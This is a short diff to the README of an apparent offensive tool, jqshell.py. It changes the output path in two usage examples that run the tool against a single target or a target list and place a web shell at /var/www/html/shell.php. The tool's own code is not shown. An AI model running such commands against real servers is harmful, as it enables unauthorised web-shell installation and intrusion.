@@ -66,11 +66,11 @@ python3 jqshell.py -t localhost/folderwerejqueryis -s /var/www/html/shell.php
 ```
 Running agianst single target, with saving output.
 ```shell
-python3 jqshell.py -t localhost/folderwerejqueryis -s /var/www/html/shell.php -o /pwned.txt
+python3 jqshell.py -t localhost/folderwerejqueryis -s /var/www/html/shell.php -o pwned.txt
 ```
 Running a list, with saving output.
 ```shell
-python3 jqshell.py -l /opt/jquery/test.txt -s /var/www/html/shell.php -o /pwned.txt
+python3 jqshell.py -l /opt/jquery/test.txt -s /var/www/html/shell.php -o pwned.txt
 ```
 **Author**
 
